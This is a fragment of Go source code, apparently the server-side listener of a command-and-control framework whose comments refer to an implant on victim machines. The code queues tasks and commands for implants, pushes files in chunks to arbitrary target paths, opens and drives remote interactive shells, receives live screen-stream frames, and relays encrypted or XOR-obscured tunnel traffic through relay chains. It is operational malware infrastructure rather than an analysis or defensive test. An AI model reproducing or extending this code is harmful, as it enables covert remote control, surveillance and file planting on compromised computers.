	sess, err := l.sessionMgr.Get(sessionID)
	if err != nil || sess == nil {
		return
	}
	sess.LastSeen = time.Now()
	sess.Info.LastSeen = time.Now()
	if len(packet.Payload) < 4 {
		return
	}
	dataLen := binary.BigEndian.Uint32(packet.Payload[:4])
	if len(packet.Payload) < 4+int(dataLen) {
		return
	}
	tunnelData := packet.Payload[4 : 4+int(dataLen)]
	tp, err := tunnel.DecodeTunnelPacket(tunnelData)
	if err != nil {
		return
	} else if tp != nil {
		sess.DispatchTunnelData(tp)
	}
}

// handleScreenFrame 接收植入端实时屏幕流帧并广播到前端。
func (l *TCPListener) handleScreenFrame(conn net.Conn, packet *protocol.Packet) {
	sessionID := fmt.Sprintf("%x", packet.ID)
	if sess, err := l.sessionMgr.Get(sessionID); err == nil && sess != nil {
		sess.LastSeen = time.Now()
		sess.Info.LastSeen = time.Now()
	}
	if l.onScreenFrame != nil {
		l.onScreenFrame(sessionID, packet.Payload)
	}
}

// ─── API: 发送 ─────────────────────────────────────────────────────────────────────

func (l *TCPListener) PushTask(sessionID string, taskInfo *types.TaskInfo) error {
	taskPayload, err := json.Marshal(protocol.Task{
		ID:          taskInfo.ID,
		TaskType:    taskInfo.TaskType,
		Command:     taskInfo.Command,
		Args:        taskInfo.Args,
		Timeout:     taskInfo.Timeout,
		ExecuteType: taskInfo.ExecuteType,
		Path:        taskInfo.Path,
		PID:         taskInfo.PID,
		Data:        taskInfo.Data,
	})
	if err != nil {
		return fmt.Errorf("failed to marshal task: %w", err)
	}
	packet := &protocol.Packet{
		Magic:     [4]byte{'T', 'S', 'H', 'L'},
		Version:   protocol.Version,
		Type:      protocol.TypeTask,
		ID:        0,
		Timestamp: uint64(time.Now().UnixMilli()),
		Payload:   taskPayload,
	}
	if err := l.queuePacket(sessionID, packet, true); err != nil {
		l.sessionMgr.ClearConnection(sessionID)
		return fmt.Errorf("failed to send task: %w", err)
	}
	now := time.Now()
	taskInfo.Status = "sent"
	taskInfo.SentAt = &now
	fmt.Printf("[INFO] [tcp-listener] Task %d pushed to session %s\n", taskInfo.ID, sessionID)
	return nil
}

// PushFileUpload 将 API 层暂存的 data/uploads/<sessionID>/<uploadID> 分片推送至植入端。
// 数据帧走 TypeFileUpload 帧（与下载直传对称），首帧携带目标路径，done 帧收尾，
// 植入端写完文件后回传 TypeResult 完成整个任务。
func (l *TCPListener) PushFileUpload(sessionID, uploadID, filename, targetPath string, size int64, taskID uint64) error {
	if uploadID == "" || strings.ContainsAny(uploadID, `/\:`) {
		return fmt.Errorf("invalid upload id %q", uploadID)
	}
	if targetPath == "" || strings.ContainsRune(targetPath, 0) {
		return fmt.Errorf("invalid target path")
	}

	src := filepath.Join("data", "uploads", sessionID, uploadID)
	f, err := os.Open(src)
	if err != nil {
		return fmt.Errorf("upload staging file not found: %w", err)
	}
	defer f.Close()

	buf := make([]byte, fileUpChunkSize)
	var offset int64
	for {
		n, rerr := f.Read(buf)
		if n > 0 {
			chunk, _ := json.Marshal(map[string]interface{}{
				"upload_id": uploadID,
				"task_id":   taskID,
				"filename":  filename,
				"path":      targetPath,
				"size":      size,
				"offset":    offset,
				"done":      false,
				"data":      base64.StdEncoding.EncodeToString(buf[:n]),
			})
			packet := &protocol.Packet{
				Magic:     [4]byte{'T', 'S', 'H', 'L'},
				Version:   protocol.Version,
				Type:      protocol.TypeFileUpload,
				ID:        0,
				Timestamp: uint64(time.Now().UnixMilli()),
				Payload:   chunk,
			}
			if err := l.queuePacket(sessionID, packet, true); err != nil {
				return fmt.Errorf("failed to push upload chunk: %w", err)
			}
			offset += int64(n)
		}
		if rerr != nil {
			if rerr != io.EOF {
				return rerr
			}
			break
		}
	}

	// 完成标记帧
	doneChunk, _ := json.Marshal(map[string]interface{}{
		"upload_id": uploadID,
		"task_id":   taskID,
		"filename":  filename,
		"path":      targetPath,
		"size":      size,
		"offset":    offset,
		"done":      true,
	})
	packet := &protocol.Packet{
		Magic:     [4]byte{'T', 'S', 'H', 'L'},
		Version:   protocol.Version,
		Type:      protocol.TypeFileUpload,
		ID:        0,
		Timestamp: uint64(time.Now().UnixMilli()),
		Payload:   doneChunk,
	}
	if err := l.queuePacket(sessionID, packet, true); err != nil {
		return fmt.Errorf("failed to push upload done frame: %w", err)
	}
	// 推送完成即删除服务端暂存文件，避免磁盘持续占用
	f.Close()
	if rmErr := os.Remove(src); rmErr != nil && !os.IsNotExist(rmErr) {
		fmt.Printf("[WARN] [tcp-listener] failed to remove upload staging %s: %v\n", src, rmErr)
	}
	return nil
}

func (l *TCPListener) OpenShell(sessionID string, shell string) error {
	payload, _ := json.Marshal(map[string]string{"shell": shell})
	packet := &protocol.Packet{
		Magic:     [4]byte{'T', 'S', 'H', 'L'},
		Version:   protocol.Version,
		Type:      protocol.TypeShellOpen,
		ID:        0,
		Timestamp: uint64(time.Now().UnixMilli()),
		Payload:   payload,
	}
	return l.queuePacket(sessionID, packet, true)
}

func (l *TCPListener) SendShellInput(sessionID string, data string) error {
	payload, _ := json.Marshal(map[string]string{"data": data})
	packet := &protocol.Packet{
		Magic:     [4]byte{'T', 'S', 'H', 'L'},
		Version:   protocol.Version,
		Type:      protocol.TypeShellData,
		ID:        0,
		Timestamp: uint64(time.Now().UnixMilli()),
		Payload:   payload,
	}
	return l.queuePacket(sessionID, packet, true)
}

func (l *TCPListener) CloseShell(sessionID string) error {
	packet := &protocol.Packet{
		Magic:     [4]byte{'T', 'S', 'H', 'L'},
		Version:   protocol.Version,
		Type:      protocol.TypeShellClose,
		ID:        0,
		Timestamp: uint64(time.Now().UnixMilli()),
		Payload:   []byte("{}"),
	}
	return l.queuePacket(sessionID, packet, true)
}

// ─── gost 风格隧道写入（无队列、无 AES-GCM、XOR only） ─────────────────────────────

// SendTunnelRaw 发送隧道数据到植入端（含经中继链的隧道转发）。
// 直连走 writeRaw 快速路径；中继子会话则包装成 TypeRelay 帧转发。
// rawPacket 已是 EncodeTunnelPacket 编码的隧道消息，格式 [1B op][4B sid][...][4B dataLen][data]。
func (l *TCPListener) SendTunnelRaw(sessionID string, rawPacket []byte) error {
	return l.sendRawOrDirect(sessionID, rawPacket, 0)
}

// SendTunnelPacket 编码 TunnelPacket 并通过 raw 帧发送。
func (l *TCPListener) SendTunnelPacket(sessionID string, tunnelPacket *tunnel.TunnelPacket) error {
	packetData := tunnel.EncodeTunnelPacket(tunnelPacket)
	return l.SendTunnelRaw(sessionID, packetData)
}

// ─── SM4-GCM 隧道工具函数 ──────────────────────────────────────────────────────────

// decryptTunnel 解密隧道帧：剥离 12B nonce 后 SM4-GCM 校验并解密，返回明文。
// 认证失败 / 帧过短时返回 nil（丢弃该帧），防止伪造或篡改的隧道数据进入转发。
func (l *TCPListener) decryptTunnel(frame []byte) []byte {
	pt, err := crypto.SM4DecryptTunnel(frame, l.sm4Key)
	if err != nil {
		return nil
	}
	return pt
}
